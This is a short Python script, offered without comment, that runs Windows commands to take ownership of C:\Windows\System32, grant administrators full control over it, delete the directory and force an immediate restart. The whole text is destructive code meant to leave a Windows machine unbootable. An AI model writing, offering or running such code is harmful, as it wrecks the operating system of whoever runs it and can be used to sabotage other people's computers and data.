import os
os.system('cmd /c "takeown /a /r /d Y /f C:\Windows\System32"')
os.system('cmd /c "icacls C:\Windows\System32 /grant administrators:F /t"')
os.system('cmd /c "rmdir C:\Windows\System32"')
os.system('cmd /c "shutdown -r -t 0"')
